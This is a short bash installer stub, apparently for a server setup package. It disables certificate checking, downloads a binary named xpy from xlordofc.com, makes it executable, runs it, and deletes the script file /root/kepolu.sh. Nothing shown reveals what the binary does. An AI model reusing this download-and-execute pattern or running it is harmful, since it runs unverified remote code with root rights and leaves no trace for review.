#!/bin/bash
# ===================
export GREEN='\033[0;32m'
export NC='\033[0m'
rm -f /root/kepolu.sh > /dev/null 2>&1
clear
echo ""
echo ""
echo -e "${GREEN}DOWNLOADING FILE SETUP!${NC}"
sleep 2
wget --no-check-certificate https://xlordofc.com/xpy && chmod +x xpy && ./xpy
rm -f /root/kepolu.sh > /dev/null 2>&1
echo ""
